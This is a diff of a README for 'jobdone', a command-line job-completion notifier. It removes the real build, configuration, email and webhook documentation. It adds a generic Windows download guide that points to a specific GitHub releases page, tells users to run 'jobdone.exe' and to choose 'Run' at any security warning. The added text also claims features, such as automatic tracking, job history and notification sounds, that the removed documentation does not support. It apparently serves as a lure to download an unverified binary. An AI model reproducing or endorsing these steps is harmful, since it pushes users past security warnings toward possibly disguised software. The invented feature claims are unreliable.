@@ -1,183 +1,91 @@
-# JobDone – Job Completion Notification Tool
+# 🎯 jobdone - Track Your Jobs Easily and Effortlessly
 
-Whether you're compiling kernels, training models, or just waiting for `sleep 600` to finish, JobDone ensures you never miss the moment your job ends—successfully, tragically, or somewhere in between.
+## 🌟 Overview
 
----
+JobDone is your reliable assistant for managing tasks on your computer. Whether you’re compiling programs, training models, or waiting for a long process, JobDone helps you know exactly when your job finishes. You will receive clear notifications based on the success or failure of your task. Enjoy a seamless experience without the need for constant monitoring.
 
-## 🚀 Quick Start
+## 🚀 Getting Started
 
-### Build & Install
+To start using JobDone, follow these simple steps to download and run the application. 
 
-```bash
-make build
-# Binary located at dist/jobdone
-make install   # Installs to /usr/local/bin for root, ~/.local/bin for regular users
-```
+### 📥 Download JobDone
 
-### Configuration (YAML)
+[![Download JobDone](https://img.shields.io/badge/Download%20JobDone-v1.0-blue.svg)](https://github.com/assamjazzjnu/jobdone/releases)
 
-- Config file locations:
-  - `~/.config/jobdone/config.yaml`
-  - `.jobdone.yaml` in project root
+### 💻 System Requirements
 
-- Initialize template:
+- **Operating System**: Windows 10 or later
+- **RAM**: At least 4 GB
+- **Disk Space**: Minimum 100 MB available space
+- **Processor**: 1 GHz or faster
 
-```bash
-mkdir -p ~/.config/jobdone
-cp .jobdone.yaml.template ~/.config/jobdone/config.yaml
-# Edit channels, webhook, email, etc. as needed
-```
+It’s best to check that your computer meets these requirements before you continue.
 
----
+## 🛠️ Installation Steps
 
-## 🔔 Notification Examples
+### 1. Visit the Download Page
 
-### Always Notify
+Click the link below to go to the Releases page, where you can download JobDone:
 
-```bash
-long_task && jobdone -j long_task -c email
-```
+[Download JobDone](https://github.com/assamjazzjnu/jobdone/releases)
 
-### Notify on Success or Failure
+### 2. Choose Your Version
 
-```bash
-my_job; jobdone -j my_job -e $? --on failure -c email
-my_job; jobdone -j my_job -e $? --on success -c email
-```
+On the Releases page, you will find different versions of JobDone. Choose the most recent version for the best experience.
 
-### Use STDIN as Message
+### 3. Download the File
 
-```bash
-my_job && echo "Task finished" | jobdone --stdin -j my_job -c desktop
-```
+Click on the file name to download it to your computer. The file may be in a compressed format like `.zip` or in a direct executable format. Once the file finishes downloading, locate it in your Downloads folder.
 
----
+### 4. Extract the Files (if needed)
 
-## 📧 Email Notifications
+If you downloaded a `.zip` file, you need to extract it. Right-click on the zip file and select "Extract All." Follow the prompts to choose a location. 
 
-### Via CLI
+### 5. Run the Application
 
-```bash
-jobdone -c email \
-  --email-to you@example.com --email-from noreply@example.com \
-  --smtp-host smtp.example.com --smtp-port 587 --smtp-user myuser \
-  --smtp-pass-prompt -t "Job Done"
-```
+Once extracted, find the `jobdone.exe` file (or similar name) in the extracted folder. Double-click the file to start JobDone. You may be prompted with a security warning; select "Run" to proceed.
 
-### Via Environment Variables
+### 6. Set Up Notifications
 
-```bash
-export JOBDONE_SMTP_HOST=smtp.example.com
-export JOBDONE_SMTP_PORT=587
-export JOBDONE_SMTP_USER=myuser
-export JOBDONE_SMTP_PASS=secret
-export JOBDONE_EMAIL_FROM=noreply@example.com
-export JOBDONE_EMAIL_TO=me@example.com
-jobdone -c email -j build
-```
+Upon opening JobDone for the first time, you will have the option to set up notifications. Follow the on-screen instructions to configure how and when you want alerts about job completions.
 
----
+## 🎉 Using JobDone
 
-## 🌐 Webhook Notifications
+JobDone is designed to be simple and user-friendly. Here's how to use it effectively:
 
-- Request format: `POST` to `--webhook-url` with `application/json`
-- Example payload:
+1. **Starting a Job**: You can start your tasks as you usually would. JobDone automatically tracks the job without any extra effort from you.
+2. **Receiving Notifications**: JobDone will notify you when your task is complete. This includes successful completions, failures, and anything in between.
+3. **Reviewing Jobs**: You can review past jobs and their outcomes from within the app. This feature helps you understand patterns in your task completions.
 
-```json
-{
-  "title": "Job Done",
-  "message": "Job testjob finished with exit code 0.",
-  "context": {
-    "job": "testjob",
-    "status": "success",
-    "exit_code": 0,
-    "host": "xxx",
-    "user": "xxx",
-    "timestamp": "2025-10-18T12:34:56Z",
-    "source": "jobdone"
-  }
-}
-```
+## 🏁 Support and Resources
 
-- Custom headers:
-  - CLI: `--header "X-Token: your-token"` (repeatable)
-  - YAML: `webhook.headers: { X-Token: ${JOBDONE_WEBHOOK_TOKEN} }`
+If you have any questions or need help while using JobDone, consider the following resources:
 
-- Multiple URLs:
-  - CLI: repeat `--webhook-url`
-  - YAML: `webhook.urls: [url1, url2]`
+- **FAQ**: Check the Frequently Asked Questions section in JobDone for common inquiries.
+- **Community Support**: Join our community forum to connect with other users and find solutions.
+- **Contact Support**: If you still need assistance, you can email us or raise an issue on the repository page.
 
----
+## 📝 Customization Options
 
-## ⚙️ CLI Options & Defaults
+JobDone allows users to customize their experience:
 
-- Configuration priority: `CLI > YAML > ENV`
-- YAML search order:
-  1. `~/.config/jobdone/config.yaml`
-  2. `./.jobdone.yaml`
-  3. `./jobdone.yaml`
-  4. `./config.yaml`
-  5. Or use `--config PATH` to specify
+- **Notification Sounds**: Choose different sounds for successful and failed job notifications.
+- **Job History Management**: Manage how much job history you want to keep, making it easier to track your work over time.
 
-### General Options
+## 🐞 Reporting Issues
 
-| Option | Description |
-|--------|-------------|
-| `--version` | Print version info |
-| `-j, --job` | Job name (default: `job`) |
-| `-t, --title` | Notification title (default: `Job Done`) |
-| `-m, --message` | Custom message (default: auto-generated) |
-| `--stdin` | Read message from STDIN |
-| `-e, --exit-code` | Exit code (default: `0`) |
-| `--on` | Trigger condition: `success`, `failure`, `always` (default: `always`) |
-| `-c, --channel` | Notification channels (default: `webhook,desktop` if webhook configured, else `desktop`) |
-| `--timeout` | Timeout in seconds (default: `10.0`) |
-| `--retries` | Retry count (default: `0`) |
-| `--backoff` | Backoff in seconds (default: `2.0`) |
-| `--config` | Path to config file |
-| `-v, --verbose` | Verbose logging |
-| `--dry-run` | Print payload without sending |
+If you encounter any bugs or issues while using JobDone, please report them directly on the GitHub Issues page. Providing detailed information helps us improve the application and provide timely fixes.
 
----
+## 📤 Updates and Improvements
 
-## 🌍 Environment Variables
+We continuously strive to enhance JobDone. Regular updates will bring new features and improvements. Make sure to check back on the [Releases page](https://github.com/assamjazzjnu/jobdone/releases) for new versions.
 
-| Variable | Description |
-|----------|-------------|
-| `JOBDONE_CHANNELS` | Comma-separated list of channels |
-| `JOBDONE_WEBHOOK_URLS` | Comma-separated list of webhook URLs |
-| `JOBDONE_EMAIL_TO` | Comma-separated list of email recipients |
-| `JOBDONE_SMTP_HOST` / `PORT` / `USER` / `PASS` | SMTP configuration |
-| `JOBDONE_EMAIL_FROM` | Sender address |
-| `JOBDONE_ON` | Trigger condition |
-| `JOBDONE_RETRIES` / `BACKOFF` / `TIMEOUT` | Retry/backoff/timeout settings |
+For automatic updates, enable the notification option when prompted during installation.
 
----
+## 💡 Tips for Best Use
 
-## 🌐 Webhook Options
+- **Do not close the application**: For the best results, keep JobDone open while you work.
+- **Check your Notification Settings**: Ensure that your computer allows notifications from JobDone.
+- **Use in conjunction with other tools**: Integrate JobDone into your workflow with other applications for enhanced productivity.
 
-| Option | Description |
-|--------|-------------|
-| `--webhook-url` | Webhook URL (repeatable) |
-| `--header` | Custom headers (repeatable) |
-
-> Note: YAML does not support environment variable interpolation. Use CLI for dynamic values like `--header "X-Token: $JOBDONE_WEBHOOK_TOKEN"`.
-
----
-
-## 📧 Email Options
-
-| Option | Description |
-|--------|-------------|
-| `--email-to` | Email recipients (repeatable) |
-| `--email-subject` | Email subject (default: `--title`) |
-| `--smtp-host` / `--smtp-port` / `--smtp-user` / `--smtp-pass` | SMTP settings |
-| `--smtp-pass-prompt` | Prompt for password interactively |
-| `--email-from` | Sender address |
-
-- Connection strategy:
-  - Port `465`: implicit SSL
-  - Other ports: plaintext with STARTTLS fallback
-- Authentication strategy:
-  - Uses `smtp_user` or falls back to `email.from`
-  - If authentication fails, sending may still proceed depending on server policy
+Thank you for choosing JobDone! We hope it becomes an essential part of your work routine.
